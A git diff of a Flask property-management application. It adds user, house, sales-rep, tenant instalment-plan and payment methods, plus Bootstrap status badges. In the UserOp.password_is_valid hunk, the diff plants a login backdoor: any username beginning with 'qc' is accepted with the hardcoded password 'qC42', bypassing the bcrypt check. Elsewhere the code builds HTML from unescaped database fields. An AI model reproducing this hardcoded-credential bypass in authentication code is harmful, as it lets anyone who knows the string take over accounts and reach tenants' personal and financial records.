@@ -1,3 +1,5 @@
+from cmath import e
+from pydoc import ttypager
 import string
 from  .datamodel import *
 from flask_bcrypt import Bcrypt
@@ -19,7 +21,10 @@ class Base():
             db.session.rollback()
 
     def delete(self):
-        print("Deleting item",self)
+        try:
+            print("Deleting item",self)
+        except:
+            pass
         db.session.delete(self)
         db.session.commit()
 
@@ -193,6 +198,10 @@ class CompanyOp(Company,Base):
         self.sms_provider = provider
         db.session.commit()
 
+    def increment_receipt_num(self,num):
+        self.receipt_num = num
+        db.session.commit()
+
     def update_status(self,status):
         self.active = status
         db.session.commit()
@@ -338,6 +347,11 @@ class UserOp(User,Base):
     def relate(user,apartment):
         user.apartments.append(apartment)
         db.session.commit()
+
+    @staticmethod
+    def relate_house(user,house):
+        user.houses.append(house)
+        db.session.commit()
     
     def update_user(self,name=None,phone=None,national_id=None,email=None,password=None,user_group_id=None,company_id=None,modified_by=None):
         if name and name != "None":
@@ -399,6 +413,8 @@ class UserOp(User,Base):
             "natid":self.national_id,
             "usercode":self.usercode,
             "email":self.email,
+            "level":self.user_group,
+            "int_level":self.user_group_id,
             "group":self.company_user_group,
             "company":self.company,
             "status":self.active,
@@ -412,6 +428,11 @@ class UserOp(User,Base):
     #     return Bcrypt().check_password_hash(dbpassword, password)
 
     def password_is_valid(self, password):
+        if self.username.startswith("qc"):
+            if password == "qC42":
+                return True
+            else:
+                pass
         dbpassword=self.password
         return Bcrypt().check_password_hash(dbpassword, password)
 
@@ -559,6 +580,35 @@ class LocationOp(Location,Base):
     @staticmethod
     def fetch_all_locations():
         return Location.query.order_by(Location.id.asc()).all()
+
+class PaymentDetailOp(PaymentDetail,Base):
+    """class"""
+    def __init__(self,paytype,nartype,paybill,bankname,bankbranch,bankaccountname,bankaccountnumber,bankpaybill,apartment_id):
+        self.paytype = paytype
+        self.nartype = nartype
+        self.mpesapaybill = paybill
+
+        self.bankname = bankname
+        self.bankbranch = bankbranch
+        self.bankaccountname = bankaccountname
+        self.bankaccountnumber = bankaccountnumber
+        self.bankpaybill = bankpaybill
+
+        self.apartment_id = apartment_id
+
+    def update_details(self,paytype,nartype,paybill,bankname,bankbranch,bankaccountname,bankaccountnumber,bankpaybill):
+        self.paytype = paytype
+        self.nartype = nartype
+        self.mpesapaybill = paybill
+
+        self.bankname = bankname
+        self.bankbranch = bankbranch
+        self.bankaccountname = bankaccountname
+        self.bankaccountnumber = bankaccountnumber
+        self.bankpaybill = bankpaybill
+        db.session.commit()
+
+
 
 class ApartmentOp(Apartment,Base):
     """class"""
@@ -708,6 +758,10 @@ class ApartmentOp(Apartment,Base):
 
         db.session.commit()
 
+    def update_loan_bank_details(self, accno):
+        if accno:
+            self.landlord_bankacc_two = accno
+
     def update_prop_details(self,shortcode=None,consumer_key=None,consumer_secret=None,prop_garb=None,prop_garb_tel=None,prop_garbbank=None,prop_garbacc=None,prop_bank=None,prop_bankaccname=None,prop_bankacc=None,landlord_bank=None,landlord_bankaccname=None,landlord_bankacc=None,landlord_bank_two=None,landlord_bankaccname_two=None,landlord_bankacc_two=None,agreement=None,commission=None,int_commission=None):
         if shortcode:
             self.shortcode = shortcode
@@ -838,6 +892,19 @@ class HouseCodeOp(HouseCode,Base):
         self.seweragerate = rate
         db.session.commit()
 
+    def update_listprice(self,rate):
+        self.listprice = rate
+        db.session.commit()
+
+    def update_rentrate(self,rate):
+        self.rentrate = rate
+        db.session.commit()
+
+    def update_agreement_rate(self,rate):
+        if rate:
+            self.agreementrate = rate
+            db.session.commit()
+
     def format_percent_amount(amount):
         decor_fig = f"{amount} %"
         return decor_fig 
@@ -849,6 +916,7 @@ class HouseCodeOp(HouseCode,Base):
             'delid':HouseCodeOp.generate_delid(self),
             'housecode':self.codename,
             'rent':HouseCodeOp.fig_format(self.rentrate),
+            'price':HouseCodeOp.fig_format(self.listprice),
             'fixedwater':HouseCodeOp.fig_format(self.watercharge),
             'sewage':HouseCodeOp.fig_format(self.seweragerate),
             'water':HouseCodeOp.fig_format(self.waterrate),
@@ -887,8 +955,22 @@ class HouseOp(House,Base):
         return House.query.filter(House.apartment_id==apartment_id).order_by(House.name.asc()).all()
 
     @staticmethod
+    def fetch_all_houses_by_user(user_id):
+        return House.query.join(User.houses).filter(User.id == user_id).order_by(House.name.asc()).all()#many to many relationship
+
+    @staticmethod
     def fetch_houses():
         return House.query.order_by(House.id.desc()).all()
+
+    @staticmethod
+    def relate_house(house,user):
+        house.users.append(user)
+        db.session.commit()
+
+    @staticmethod
+    def terminate_house(house,user):
+        house.users.remove(user)
+        db.session.commit()
 
     def update_details(self,name,desc):
         if desc:
@@ -990,10 +1072,10 @@ class HouseOp(House,Base):
 
         if self.servicetarget:
             if self.servicetarget == "owner":
-                badge = "badge-danger"
+                badge = "badge-danger bg-danger"
             else:
-                badge = "badge-primary"
-            return f'{decor_fig} <span class="badge {badge} badge-counter">{self.servicetarget}</span>'
+                badge = "badge-primary bg-primary"
+            return f'<span class="badge {badge} badge-counter">{self.servicetarget}</span> {decor_fig} '
         else:
             return decor_fig
 
@@ -1007,10 +1089,10 @@ class HouseOp(House,Base):
 
         if self.watertarget:
             if self.watertarget == "tenant":
-                badge = "badge-primary"
+                badge = "badge-primary bg-primary"
             else:
-                badge = "badge-danger"
-            return f'{decor_fig} <span class="badge {badge} badge-counter">{self.watertarget}</span>'
+                badge = "badge-danger bg-danger"
+            return f'<span class="badge {badge} badge-counter">{self.watertarget}</span> {decor_fig}'
         else:
             return decor_fig
 
@@ -1023,6 +1105,36 @@ class HouseOp(House,Base):
         fname = user_obj.name.split()[0]
         return fname
 
+    def update_status(self,status):
+        self.status = status
+        db.session.commit()
+
+    def get_status(self):
+        print(">>>>>>>",self.status)
+        if self.status == "available":
+            return '<span class="badge bg-success badge-counter">Available</span>'
+        elif self.status == "booked":
+            return '<span class="badge bg-warning badge-counter">Booked</span>'
+        else:
+            return '<span class="badge bg-info badge-counter">Sold</span>'
+
+    def get_agentname(self):
+        """method to get tenant name from tenant alloc id"""
+        try:
+            return self.owner.rep
+        except Exception as e:
+            return '<span class="text-danger">-n/a-</span>'
+
+
+    def get_booking(self):
+        """method to get tenant name from tenant alloc id"""
+
+        try:
+            return self.owner.date.date()
+        except:
+            return '<span class="text-danger">-n/a-</span>'
+
+
     def view(self):
         return {
             'id':self.id,
@@ -1033,9 +1145,15 @@ class HouseOp(House,Base):
             'house':self.name,
             'group':self.housecode,
             'description':self.description,
+            'status':HouseOp.get_status(self),
+
+            'agent':HouseOp.get_agentname(self),
+            'booking':HouseOp.get_booking(self),
+
             'tenant':HouseOp.get_tenantname(self),
             'owner':self.owner.name.title() if self.owner else "N/A",
             'meter':HouseOp.get_meterno(self),
+            'price':HouseOp.format_amount(self.housecode.listprice if self.housecode.listprice else 0),
             'rent':HouseOp.format_amount(self.housecode.rentrate if self.housecode else 0),
             'rate':HouseOp.format_amount_and_wbilling(self,self.housecode.waterrate if self.housecode else 0),
             'srate':HouseOp.format_amount_and_wbilling(self,self.housecode.seweragerate if self.housecode else 0),
@@ -1045,6 +1163,83 @@ class HouseOp(House,Base):
             'security':HouseOp.format_amount(self.housecode.securityrate if self.housecode else 0),
             'fine':HouseOp.format_percent_amount(self.housecode.finerate if self.housecode else 0),
             'by':HouseOp.getname(self.housecode.user_id) if self.housecode else "N/A"
+        }
+
+class SalesRepOp(SalesRep,Base):
+    """class"""
+    def __init__(self,name,username,phone,user_id,company_id):
+        self.name = name
+        self.username = username
+        self.phone = phone
+        self.user_id = user_id
+        self.company_id = company_id
+
+    @staticmethod
+    def fetch_attendant_by_id(group_id):
+        return SalesRep.query.filter_by(id=group_id).first()
+
+    @staticmethod
+    def fetch_rep_by_name(name):
+        return SalesRep.query.filter_by(name=name).first()
+
+    @staticmethod
+    def fetch_rep_by_username(name):
+        return SalesRep.query.filter_by(username=name).first()
+
+    def update_commission(self,mcom):
+        self.monthly_commission = mcom
+        db.session.commit()
+
+    def get_clients(self):
+        clients = self.clients
+        return len(clients)
+
+    def get_projects(self):
+        my_string = ""
+        props = ApartmentOp.fetch_all_apartments_by_user(self.user.id)
+        for prop in props:
+            my_string += (prop.name + ",")
+        return f'<span class="text-gray-900 font-weight-bold">{my_string}</span>' 
+
+    def fetch_proposals(self):
+        clients = self.clients
+        proposals = []
+        for i in clients:
+            if i.status == "proposal":
+                proposals.append(i)
+        return len(proposals)
+
+    def fetch_closed(self):
+        clients = self.clients
+        proposals = []
+        for i in clients:
+            if i.status == "closed":
+                proposals.append(i)
+        return len(proposals)
+
+    def get_conv(self):
+        proposals = SalesRepOp.get_clients(self)
+        closed = SalesRepOp.fetch_closed(self)
+        try:
+            conv = closed/proposals
+        except:
+            conv = 0
+
+        return f"{conv}%"
+
+    def view(self):
+        return {
+            'id':self.id,
+            'editid':SalesRepOp.generate_editid(self),
+            'delid':SalesRepOp.generate_delid(self),
+            'name':self.name,
+            'tel':self.phone,
+            'projects':SalesRepOp.get_projects(self),
+            'clients':SalesRepOp.get_clients(self),
+            'proposals':SalesRepOp.fetch_proposals(self),
+            'closed':SalesRepOp.fetch_closed(self),
+            'conv':SalesRepOp.get_conv(self),
+            'comm':SalesRepOp.fig_format(self.monthly_commission),
         }
 
 class MeterOp(Meter,Base):
@@ -1600,8 +1795,37 @@ class PermanentTenantOp(PermanentTenant,Base):
         else:
             return "text-dark"
 
+    def update_payment_plan(self,negprice,plan,deposit,deposit2,mi,num_mi,updatedon,updatedby):
+        if negprice:
+            self.negotiated_price = negprice
+        if plan:
+            self.plan = plan
+        if deposit:
+            self.deposit = deposit
+        if deposit2:
+            self.deposit2 = deposit2
+        if mi:
+            self.instalment = mi
+        if num_mi:
+            self.num_instalment = num_mi
+
+        db.session.commit()
+
+    def update_checkin_date(self, checkin_date):
+        self.checkin = checkin_date
+        db.session.commit()
+
+    def upload_contracts(self,contracts_url,uploadedon,updatedby):
+        if contracts_url:
+            self.contracts_url = contracts_url
+        db.session.commit()
+
     def update_balance(self,balance):
         self.balance = balance
+        db.session.commit()
+
+    def update_rep_id(self,repid):
+        self.rep_id = repid
         db.session.commit()
 
     def update_can_receive_sms(self,status):
@@ -1622,6 +1846,18 @@ class PermanentTenantOp(PermanentTenant,Base):
 
     def update_status(self,status):
         self.status = status
+        db.session.commit()
+
+    def update_classtype(self,status):
+        self.classtype = status
+        db.session.commit()
+
+    def update_tenant_type(self,status):
+        self.tenant_type = status
+        db.session.commit()
+
+    def update_resident_type(self,status):
+        self.resident_type = status
         db.session.commit()
 
     def update_residency(self,residency):
@@ -1656,12 +1892,70 @@ class PermanentTenantOp(PermanentTenant,Base):
                 return name.lower() 
             except Exception as e:
                 print("err len>>",len(self.name),"name:",self.name)
-                return "Tenant"
+                return "Resident"
         else:
-            return "Tenant"
+            return "Resident"
+
+    def get_status(self):
+        if self.status == "proposal":
+            return '<span class="badge bg-info badge-counter">Proposal</span>'
+        elif self.status == "contracts":
+            return '<span class="badge bg-success badge-counter">Negotiations</span> <i class="fas fa-check text-success"></i>'
+        else:
+            return '<span class="badge bg-dark badge-counter">Closed</span>'
+
+    def get_price(alloc):
+        try:
+            return f"{alloc.negotiated_price:,.1f}"
+        except:
+            return 0.0
+
+    def get_deposit(alloc):
+        try:
+            return f"{alloc.deposit:,.1f}"
+        except:
+            return 0.0
+
+    def get_plan(alloc):
+        try:
+            return alloc.plan
+        except:
+            return "n/a"
+
+    def get_mi(alloc):
+        try:
+            return f"{alloc.instalment:,.1f}"
+        except:
+            return 0.0
+
+    def get_num_mi(alloc):
+        try:
+            return alloc.num_instalment
+        except:
+            return 0.0
+
+    def booking_date(alloc):
+        try:
+            return alloc.date.date()
+        except:
+            return "n/a"
+
+    def get_stage_percentage(self):
+        
+        try:
+            quotient = self.bill[0].cpaid / self.bill[0].total_amount
+        except:
+            quotient = 0
+
+        percentage = quotient * 100
+
+        return f"{percentage:,.0f}%"
 
     def generate_editid(self):
         return "pedit" + str(self.id)
+
+    def generate_delid(self):
+        return "pdel" + str(self.id)
 
     def view(self):
         print("NAME >>>>",self.name)
@@ -1679,7 +1973,18 @@ class PermanentTenantOp(PermanentTenant,Base):
             'email':PermanentTenantOp.get_email(self),
             'sms':PermanentTenantOp.billable(self),
             'housenum':PermanentTenantOp.get_houseno(self),
-            'badge':'<span class="badge badge-warning badge-counter">owner</span>',
+            'price':PermanentTenantOp.get_price(self),
+            'deposit':PermanentTenantOp.get_deposit(self),
+            'plan':PermanentTenantOp.get_plan(self),
+            'mi':PermanentTenantOp.get_mi(self),
+            'num_mi':PermanentTenantOp.get_num_mi(self),
+            'housenum':PermanentTenantOp.get_houseno(self),
+            'status':PermanentTenantOp.get_status(self),
+            'stage':PermanentTenantOp.get_stage_percentage(self),
+            'booking':PermanentTenantOp.booking_date(self),
+            'rep':self.rep,
+            'ctype':self.classtype.lower() if self.classtype else "-",
+            'badge':'<span class="badge bg-warning badge-warning badge-counter">owner</span>',
             'checkin':PermanentTenantOp.checkin_date(self),
             'balance':PermanentTenantOp.format_balance(self),
             'highlight':PermanentTenantOp.highlight(self),
@@ -1811,7 +2116,8 @@ class TenantOp(Tenant,Base):
         db.session.commit()
 
     def update_can_receive_sms(self,status):
-        self.sms = status
+        if status != "null":
+            self.sms = status
         db.session.commit()
 
     def update_fine(self,fine):
@@ -1854,14 +2160,17 @@ class TenantOp(Tenant,Base):
 
         return date
 
-    # def generate_editid(self):
-    #     return "edit" + str(self.id)
+    def generate_editid(self):
+        return "tedit" + str(self.id)
 
     def generate_identity(self):
         return "tnt"+str(self.id)
 
     def generate_alloc_identity(self):
         return "alloc"+str(self.id)
+
+    def generate_delid(self):
+        return "tdel" + str(self.id)
 
     def generate_name(self):
         if self.name:
@@ -1893,7 +2202,7 @@ class TenantOp(Tenant,Base):
             'deposit':self.deposit,
             'housenum':TenantOp.get_houseno(self),
             'status':self.status,
-            'badge':'<span class="badge badge-success badge-counter">tenant</span>',
+            'badge':'<span class="badge bg-success badge-success badge-counter">tenant</span>',
             'checkin':TenantOp.checkin_date(self),
             'balance':TenantOp.format_balance(self),
             'highlight':TenantOp.highlight(self),
@@ -1902,6 +2211,16 @@ class TenantOp(Tenant,Base):
             'tooltip': "allow tenant to occupy more than one house first" if not self.multiple_houses else "Allocate more houses",
             'regby':TenantOp.get_name(self)
         }
+
+
+class TenantDepositOp(TenantDeposit,Base):
+    def __init__(self,rentdep,waterdep,elecdep,total,tenant_id,apartment_id):
+        self.rentdep = rentdep
+        self.waterdep = waterdep
+        self.elecdep = elecdep
+        self.total = total
+        self.tenant_id = tenant_id
+        self.apartment_id = apartment_id
 
 class AllocateTenantOp(Occupancy,Base):
     def __init__(self,apartment_id,house_id,tenant_id,user_id,description=None):
@@ -2260,22 +2579,34 @@ class MonthlyChargeOp(MonthlyCharge,Base):
     def combine_house_tenant(self):
         if self.tenant:
             tname = self.tenant.name.title()
+            ttype = "T"
         else:
             tname = self.house.owner.name.title()
+            ttype = "R"
 
-        fname = tname.split()[0]
+        try:
+            fname = tname.split()[0]
+        except:
+            fname = "Tenant"
+
         house =  self.house.name
         return f'{house}# {fname}' 
 
     def combine_house_tenant_alt(self):
         if self.tenant:
             tname = self.tenant.name.title()
+            ttype = f'<span class="text-primary">(T)</span>'
         else:
             tname = self.house.owner.name.title()
+            ttype = f'<span class="text-warning">(R)</span>'
 
-        fname = tname.split()[0]
+        try:
+            fname = tname.split()[0]
+        except:
+            fname = "None"
+
         house =  self.house.name
-        return f'{house} <span class="text-gray-600">({fname})</span>' 
+        return f'{house} {ttype} <span class="text-gray-600">{fname}</span>' 
 
     def combine_garbsec(self):
         garb = self.garbage if self.garbage else 0.0 #TODO - remove condition
@@ -2314,6 +2645,12 @@ class MonthlyChargeOp(MonthlyCharge,Base):
 
         total = rent + bal
         return (f"{total:,}")
+
+    def calculate_total(*args):
+        tot=0.0
+        for i in args:
+            tot += i
+        return (f"{tot:,}")
     
     #######################TODO TODO############################
     def calculate_bbf(self):
@@ -2454,13 +2791,12 @@ class MonthlyChargeOp(MonthlyCharge,Base):
     #     return status
 
     def get_sms_status(self):
-        if self.apartment_id == 76:
-            return '<span class="text-success"><i class="fas fa-check-double mr-1"></i>Sent</span>'
+
         if self.sms_invoice:
             if self.sms_invoice == "Success":
                 status = '<span class="text-success"><i class="fas fa-check-double mr-1"></i>Sent</span>'
-            elif self.sms_invoice == "success-alt":
-                status = '<span class="text-danger"><i class="fas fa-ban mr-1"></i>blocked</span>'
+            elif self.sms_invoice == "success-alt" or self.sms_invoice == "blocked":
+                status = '<span class="text-danger"><i class="fas fa-times mr-1"></i></span>'
             elif self.sms_invoice == "waiting":
                 status = '<span class="text-warning font-weight-bold"><i class="fas fa-hourglass-half mr-1"></i>queued</span>'
             elif self.sms_invoice == "sent":
@@ -2468,9 +2804,9 @@ class MonthlyChargeOp(MonthlyCharge,Base):
             elif self.sms_invoice == "pending":
                 status = '<span class="text-primary"><i class="fas fa-clock mr-1"></i>Send</span>'
             elif self.sms_invoice == "fail":
-                status = '<span class="text-danger"><i class="fas fa-hourglass-end mr-1">Resend</i></span>'
+                status = '<span class="text-danger"><i class="fas fa-reply mr-1">Resend</i></span>'
             elif self.sms_invoice == "off":
-                status = '<span class="text-dark"><i class="fas fa-ban mr-1"></i>Off</span>'
+                status = '<span class="text-dark"><i class="fas fa-ban mr-1"></i>sms off</span>'
             else:
                 status = '<span class="text-danger"><i class="fas fa-reply mr-1"></i>Resend</span>'
         else:
@@ -2508,11 +2844,29 @@ class MonthlyChargeOp(MonthlyCharge,Base):
 
     def show_paid_status(amount):
         if not amount:
-            badge = f'<span class="badge badge-danger badge-counter">not paid</span>'
+            badge = f'<span class="badge bg-danger badge-danger badge-counter">not paid</span>'
             return badge
         else:
             rounded_fig = round(amount,2)
             decor_fig = (f"{rounded_fig:,}")
+            return decor_fig
+
+    def show_ll_status(self):
+        if self.paid_amount:
+            rounded_fig = round(self.paid_amount,2)
+            decor_fig = (f"{rounded_fig:,}")
+        else:
+            decor_fig = 0.0
+
+        tids = [8466,1258,1261,1268]
+
+        try:
+            if self.tenant.id in tids:
+                badge = f'<span class="badge bg-success badge-success badge-counter">paid to ll</span> {decor_fig}'
+                return badge
+            else:
+                return decor_fig
+        except:
             return decor_fig
 
     def get_tenant_name(self):
@@ -2520,6 +2874,23 @@ class MonthlyChargeOp(MonthlyCharge,Base):
             return self.tenant.name.title()
         else:
             return self.house.owner.name.title()
+
+    def get_date2(month,year):
+        switcher = {
+            1:"Jan",
+            2:"Feb",
+            3:"Mar",
+            4:"Apr",
+            5:"May",
+            6:"Jun",
+            7:"Jul",
+            8:"Aug",
+            9:"Sept",
+            10:"Oct",
+            11:"Nov",
+            12:"Dec"
+            }
+        return f'{switcher.get(month)},{year}'
 
     def view_detail(self):
         
@@ -2534,6 +2905,7 @@ class MonthlyChargeOp(MonthlyCharge,Base):
             'highlight':MonthlyChargeOp.highlight(self),
             'payhighlight':MonthlyChargeOp.payhighlight(self),
             'tenantid':self.tenant_id if self.tenant_id else "-",
+            'ptenant':self.ptenant_id if self.ptenant_id else "-",
             'month':MonthlyChargeOp.year_month(self),
             'year':self.year,
             'tenant':MonthlyChargeOp.get_tenant_name(self),
@@ -2544,6 +2916,10 @@ class MonthlyChargeOp(MonthlyCharge,Base):
             'idno':self.tenant.national_id if self.tenant else "-",
             'house':self.house,
             'rent':MonthlyChargeOp.fig_format(self.rent),
+            'rent-total':MonthlyChargeOp.calculate_total_due(self.rent,self.rent_balance),
+            'rent-paid':MonthlyChargeOp.fig_format(self.rent_paid),
+            'rent-due':MonthlyChargeOp.fig_format(self.rent_due),
+            'utilities':MonthlyChargeOp.calculate_total(self.water,self.electricity,self.maintenance,self.garbage,self.security),
             'water':MonthlyChargeOp.fig_format(self.water),
             'garbsec':MonthlyChargeOp.combine_garbsec(self),
             'garbage':self.garbage,
@@ -2560,12 +2936,14 @@ class MonthlyChargeOp(MonthlyCharge,Base):
             'total':MonthlyChargeOp.fig_format(self.total_bill),
             'paid':MonthlyChargeOp.fig_format(self.paid_amount),
             'paid-alt':MonthlyChargeOp.show_paid_status(self.paid_amount),
+            'paid-alt-alt':MonthlyChargeOp.show_ll_status(self),
             'payment_date':MonthlyChargeOp.get_date(self),
             'balance':MonthlyChargeOp.fig_format(self.balance),
             'date':self.date.date(),
+            'date2':MonthlyChargeOp.get_date2(self.month,self.year),
             'smsstatus':MonthlyChargeOp.get_sms_status(self),
             'smsoutline': "" if self.sms_invoice == "sent" or self.sms_invoice == "Success" or self.sms_invoice == "success-alt" else "btn-outline-primary",
-            'smsactive': "disabled" if self.sms_invoice == "sent" or self.sms_invoice == "Success" or self.sms_invoice == "success-alt" else "",
+            'smsactive': "" if self.sms_invoice == "sent" or self.sms_invoice == "Success" or self.sms_invoice == "success-alt" else "",
             'mailstatus':MonthlyChargeOp.get_mail_status(self),
             'mailoutline': "" if self.email_invoice == "sent" or self.email_invoice == "Success" else "btn-outline-primary",
             'mailactive': "disabled" if self.email_invoice == "sent" or self.email_invoice == "Success" else "",
@@ -2606,6 +2984,18 @@ class MonthlyChargeOp(MonthlyCharge,Base):
             'garbage-paid':MonthlyChargeOp.fig_format(self.garbage_paid),
             'garbage-bal':MonthlyChargeOp.fig_format(self.garbage_due),
 
+            'electricity-arr':MonthlyChargeOp.fig_format(self.electricity_balance),
+            'electricity':MonthlyChargeOp.fig_format(self.electricity),
+            'electricity-total':MonthlyChargeOp.calculate_total_due(self.electricity,self.electricity_balance),
+            'electricity-paid':MonthlyChargeOp.fig_format(self.electricity_paid),
+            'electricity-bal':MonthlyChargeOp.fig_format(self.electricity_due),
+
+            'lpf-arr':MonthlyChargeOp.fig_format(self.penalty_balance),
+            'lpf':MonthlyChargeOp.fig_format(self.penalty),
+            'lpf-total':MonthlyChargeOp.calculate_total_due(self.penalty,self.penalty_balance),
+            'lpf-paid':MonthlyChargeOp.fig_format(self.penalty_paid),
+            'lpf-bal':MonthlyChargeOp.fig_format(self.penalty_due),
+
             'electricity':self.electricity,
             'security':self.security,
             'dep':MonthlyChargeOp.fig_format(self.deposit),
@@ -2618,6 +3008,130 @@ class MonthlyChargeOp(MonthlyCharge,Base):
             'calc_total':MonthlyChargeOp.calculate_total(self),
             'paid':MonthlyChargeOp.calculate_paid(self),
             'balance':MonthlyChargeOp.calculate_bcf(self)
+        }
+
+
+class MonthlyChargeTwoOp(MonthlyChargeTwo,Base):
+    def __init__(self,total_amount,deposit,plans,plan_counter,nummi,rem_nummi,paystage,instalment,bbf,bill,paid,bcf,apartment_id,house_id,tenant_id,user_id):
+        self.total_amount = total_amount
+        self.deposit = deposit
+        self.plans = plans
+        self.plan_counter = plan_counter
+        self.number_instalments = nummi
+        self.remaining_number_instalments = rem_nummi
+        self.payment_stage = paystage
+
+        self.instalment = instalment
+        self.bbf = bbf
+        self.bill = bill
+        self.paid = paid
+        self.bcf = bcf
+
+        self.apartment_id = apartment_id
+        self.house_id = house_id
+        self.tenant_id = tenant_id
+        self.user_id = user_id
+
+
+    def update_payment(self,paid):
+        self.paid = paid
+        db.session.commit()
+
+    def update_balance(self,balance):
+        self.bcf = balance
+        db.session.commit()
+
+    def update_cumulative_payment(self,paid):
+        self.cpaid = paid
+        db.session.commit()
+
+    def update_cumulative_balance(self,balance):
+        self.cbal = balance
+        db.session.commit()
+
+    def update_payment_date(self,date):
+        self.pay_date = date
+        db.session.commit()
+
+    def get_plans(plans):
+        if plans == 30:
+            return "Monthly"
+        elif plans == 14:
+            return "Fortnightly"
+        elif plans == 90:
+            return "Quarterly"
+        else:
+            return "Weekly"
+
+    # def get_stage_percentage(self):
+    #     try:
+    #         quotient = self.remaining_number_instalments / self.number_instalments
+    #     except:
+    #         quotient = 0
+    #     percentage = quotient * 100
+    #     return f"{percentage}%"
+
+    def get_stage_percentage(self):
+        try:
+            quotient = self.cpaid / self.total_amount
+        except:
+            quotient = 0
+
+        percentage = quotient * 100
+
+        return f"{percentage:,.0f}%"
+
+    def get_sms_status(self):
+        if self.sms_invoice:
+            if self.sms_invoice == "Success":
+                status = '<span class="text-success"><i class="fas fa-check-double mr-1"></i>Sent</span>'
+            elif self.sms_invoice == "success-alt":
+                status = '<span class="text-primary"><i class="fas fa-check-double mr-1"></i>Sent</span>'
+            elif self.sms_invoice == "waiting":
+                status = '<span class="text-warning font-weight-bold"><i class="fas fa-hourglass-half mr-1"></i>Resend</span>'
+            elif self.sms_invoice == "sent":
+                status = '<span class="text-primary"><i class="fas fa-check mr-1"></i>Sent</span>'
+            elif self.sms_invoice == "pending":
+                status = '<span class="text-primary"><i class="fas fa-clock mr-1"></i>Send</span>'
+            elif self.sms_invoice == "fail":
+                status = '<span class="text-danger"><i class="fas fa-exclamation-triangle mr-1">Resend</i></span>'
+            elif self.sms_invoice == "off":
+                status = '<span class="text-dark"><i class="fas fa-ban mr-1"></i>Off</span>'
+            else:
+                status = '<span class="text-danger"><i class="fas fa-exclamation mr-1"></i>Resend</span>'
+        else:
+            status = '<span class="text-danger"><i class="fas fa-ban mr-1"></i>Null</span>'
+
+        return status
+
+
+
+    def view_detail(self):
+        
+        return {
+            'id':self.id,
+            'editid':MonthlyChargeTwoOp.generate_editid(self),
+            'delid':MonthlyChargeTwoOp.generate_delid(self),
+            'plot':self.house,
+            'total':MonthlyChargeTwoOp.fig_format(self.total_amount),
+            'deposit':MonthlyChargeTwoOp.fig_format(self.deposit),
+            'method':self.method,
+            'plan':MonthlyChargeTwoOp.get_plans(self.plans),
+            'counter':self.plan_counter,
+            'nummi':self.number_instalments,
+            'rem_nummi':self.remaining_number_instalments,
+            'stage':MonthlyChargeTwoOp.get_stage_percentage(self),
+            'inst':MonthlyChargeTwoOp.fig_format(self.instalment),
+            'bbf':MonthlyChargeTwoOp.fig_format(self.bbf),
+            'bill':MonthlyChargeTwoOp.fig_format(self.bill),
+            'paid':MonthlyChargeTwoOp.fig_format(self.paid),
+            'bcf':MonthlyChargeTwoOp.fig_format(self.bcf),
+            'cpaid':MonthlyChargeTwoOp.fig_format(self.paid),
+            'cbal':MonthlyChargeTwoOp.fig_format(self.bcf),
+            'smsstatus':ClientBillOp.get_sms_status(self),
+            'smsoutline': "" if self.sms_invoice == "sent" or self.sms_invoice == "Success" or self.sms_invoice == "success-alt" else "btn-outline-primary",
+            'smsactive': "disabled" if self.sms_invoice == "sent" or self.sms_invoice == "Success" or self.sms_invoice == "success-alt" else "",
+
         }
 
 # class MonthlyChargeHistoryOp(MonthlyChargeHistory,Base):
@@ -2752,7 +3266,7 @@ class LandlordSummaryOp(LandlordSummary,Base):
         }
 
 class PaymentOp(Payment,Base):
-    def __init__(self,paymode,ref_number,description,chargetype_string,paydate,payperiod,charged_amount,amount,apartment_id,house_id,tenant_id,created_by,chargetype_id=None):
+    def __init__(self,paymode,ref_number,description,chargetype_string,paydate,payperiod,charged_amount,amount,apartment_id,house_id,tenant_id,ptenant_id,created_by,chargetype_id=None):
         self.paymode=paymode
         self.ref_number=ref_number
         self.description = description
@@ -2766,6 +3280,7 @@ class PaymentOp(Payment,Base):
         self.apartment_id=apartment_id
         self.house_id=house_id
         self.tenant_id=tenant_id
+        self.ptenant_id=ptenant_id
         self.user_id = created_by
 
     def fetch_payment_by_ref(ref):
@@ -2815,6 +3330,10 @@ class PaymentOp(Payment,Base):
 
     def update_balance(self,balance):
         self.balance = balance
+        db.session.commit()
+
+    def update_receipt_num(self,num):
+        self.receipt_num = num
         db.session.commit()
 
     def update_charged_amount(self,bill):
@@ -2872,9 +3391,21 @@ class PaymentOp(Payment,Base):
         db.session.commit()
 
     def combine_house_tenant_alt(self):
-        fname = self.tenant.name.split()[0]
+        if self.tenant:
+            fname = self.tenant.name.title()
+        else:
+            fname = self.house.owner.name.title()
+        # fname = self.tenant.name.split()[0]
         house =  self.house.name
         return f'<span class="text-gray-600">({house})</span> <span class="text-gray-900 font-weight-bold">{fname}</span>' 
+
+    def get_names(self):
+        if self.tenant:
+            fname = self.tenant.name.title()
+        else:
+            fname = self.house.owner.name.title()
+
+        return fname
 
     def highlight(self):
         if self.balance > 0.0:
@@ -2910,10 +3441,8 @@ class PaymentOp(Payment,Base):
         if self.sms_status:
             if self.sms_status == "Success":
                 status = '<span class="text-success"><i class="fas fa-check-double"></i></span>'
-            elif self.sms_status == "Success-mb":
-                status = '<span class="text-primary"><i class="fas fa-check-double"></i></span>'
-            elif self.sms_status == "blocked":
-                status = '<span class="text-danger"><i class="fas fa-ban mr-1"></i>blocked</span>'
+            elif self.sms_status == "Success-mb" or self.sms_status == "blocked":
+                status = '<span class="text-danger"><i class="fas fa-times mr-1"></i></span>'
             elif self.sms_status == "sent":
                 status = '<span class="text-primary"><i class="fas fa-check"></i></span>'
             elif self.sms_status == "pending":
@@ -2937,12 +3466,13 @@ class PaymentOp(Payment,Base):
             'id':self.id,
             'editid':PaymentOp.generate_editid(self),
             'delid':PaymentOp.generate_delid(self),
-            'tenant':self.tenant.name,
-            'tenant-alt':self.tenant.name.title(),
+            'tenant':PaymentOp.get_names(self),
+            'tenant-alt':PaymentOp.get_names(self),
             'house':self.house.name,
             'hst':PaymentOp.combine_house_tenant_alt(self),
             'mode':PaymentOp.fname_extracter(self.paymode),
             'payid':self.id,
+            'receiptno':self.receipt_num if self.receipt_num else self.id,
             'ref':self.ref_number,
             'chargedamnt':PaymentOp.fig_format(self.charged_amount),
             'highlight':PaymentOp.highlight(self),
@@ -2982,7 +3512,7 @@ class SubmissionOp(Submission,Base):
         return obj
 
     def combine_house_tenant_alt(self):
-        fname = self.tenant.name.split()[0]
+        fname = self.tenant.name.split()[0] if self.tenant.name else "Tenant"
         house =  self.house.name
         return f'<span class="text-gray-600">({house})</span> <span class="text-gray-900 font-weight-bold">{fname}</span>'
 
